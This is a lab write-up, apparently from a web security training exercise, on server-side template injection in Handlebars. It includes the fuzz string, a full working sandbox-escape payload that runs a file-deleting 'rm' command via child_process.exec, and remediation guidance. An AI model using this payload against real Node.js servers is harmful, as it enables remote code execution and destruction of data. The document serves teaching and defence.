@@ -1,0 +1,252 @@
+# Server-Side Template Injection in Handlebars
+
+**Lab:** Server-side template injection in Handlebars  
+**Category:** Server-Side Template Injection (SSTI)  
+**Difficulty:** Expert
+
+---
+
+# Summary
+
+This lab demonstrates a **Server-Side Template Injection (SSTI)** vulnerability in the **Handlebars** template engine. User-controlled input supplied through the `message` parameter is evaluated as a server-side template.
+
+By exploiting Handlebars' prototype manipulation and gaining access to JavaScript's `Function` constructor, it is possible to escape the template sandbox and execute arbitrary Node.js code. This ultimately leads to **Remote Code Execution (RCE)** on the server.
+
+---
+
+# Objective
+
+Delete the following file from the server:
+
+```
+/home/carlos/morale.txt
+```
+
+---
+
+# Affected Endpoint
+
+```
+GET /
+```
+
+Parameter:
+
+```
+message
+```
+
+Example:
+
+```
+GET /?message=Unfortunately+this+product+is+out+of+stock
+```
+
+---
+
+# Vulnerability Identification
+
+When attempting to view the first product, the application displays the following message:
+
+```
+Unfortunately this product is out of stock.
+```
+
+The message is controlled through the URL parameter:
+
+```
+?message=
+```
+
+---
+
+## Fuzzing
+
+A generic SSTI fuzz string was injected:
+
+```text
+${{<%[%'"}}%\
+```
+
+The application returned an internal server error containing:
+
+```
+handlebars/compiler/parser.js
+```
+
+This identifies the template engine as **Handlebars**.
+
+---
+
+# Proof of Concept
+
+A publicly known Handlebars SSTI gadget was adapted to execute arbitrary Node.js commands.
+
+Payload:
+
+```handlebars
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+```
+
+---
+
+# URL Encoded Payload
+
+The payload was URL encoded and supplied through the `message` parameter.
+
+Example:
+
+```
+GET /?message=<URL_ENCODED_PAYLOAD>
+```
+
+---
+
+# Technical Analysis
+
+The exploit abuses several Handlebars features:
+
+1. Creates helper contexts using `with`.
+2. Manipulates internal arrays using `push()` and `pop()`.
+3. Obtains a reference to JavaScript's `Function` constructor.
+4. Dynamically creates executable JavaScript code.
+5. Executes:
+
+```javascript
+require("child_process").exec("rm /home/carlos/morale.txt")
+```
+
+Since `exec()` launches a shell command, arbitrary operating system commands can be executed.
+
+---
+
+# Evidence
+
+During execution, the page rendered:
+
+```
+wrtz e 2 [object Object] function Function() { [native code] } ...
+```
+
+The appearance of
+
+```
+function Function() { [native code] }
+```
+
+confirms that the exploit successfully accessed JavaScript's native `Function` constructor.
+
+After refreshing the page, the lab was automatically marked as solved, confirming that:
+
+```
+rm /home/carlos/morale.txt
+```
+
+had executed successfully.
+
+---
+
+# Root Cause
+
+The application directly evaluates untrusted user input as a Handlebars template.
+
+Although Handlebars attempts to restrict dangerous operations, it is still possible to:
+
+- Escape the template sandbox.
+- Access JavaScript constructors.
+- Execute arbitrary Node.js code.
+
+This results in full server-side code execution.
+
+---
+
+# Impact
+
+Successful exploitation allows an attacker to:
+
+- Execute arbitrary operating system commands.
+- Read sensitive files.
+- Delete files.
+- Install malware.
+- Exfiltrate secrets.
+- Pivot further into the internal infrastructure.
+- Completely compromise the application server.
+
+Impact: **Critical**
+
+---
+
+# CWE Classification
+
+- CWE-94 — Improper Control of Generation of Code ('Code Injection')
+- CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine
+
+---
+
+# OWASP Mapping
+
+OWASP Top 10 2021
+
+- A03:2021 – Injection
+
+---
+
+# CVSS v3.1
+
+**Vector**
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+```
+
+**Base Score**
+
+```
+9.8 (Critical)
+```
+
+---
+
+# Remediation
+
+- Never render user input directly as server-side templates.
+- Disable dangerous Handlebars features where possible.
+- Prevent access to constructors such as `Function`.
+- Treat user input strictly as data rather than executable template code.
+- Apply sandboxing and template isolation.
+- Perform server-side input validation and output encoding.
+- Keep template engines updated with the latest security patches.
+
+---
+
+# Key Takeaways
+
+- Error messages can reveal the underlying template engine.
+- Handlebars SSTI often requires sandbox escape rather than simple expression evaluation.
+- Access to JavaScript's `Function` constructor enables arbitrary code execution.
+- In Node.js environments, `child_process.exec()` provides direct operating system command execution.
+- Successful SSTI can escalate to full Remote Code Execution (RCE).
+
+---
+
+# Conclusion
+
+The application is vulnerable to **Server-Side Template Injection (SSTI)** in the Handlebars template engine. By leveraging a known sandbox escape technique, arbitrary JavaScript execution was achieved, allowing execution of operating system commands through Node.js' `child_process.exec()`. This resulted in successful deletion of the target file and complete compromise of the application server.
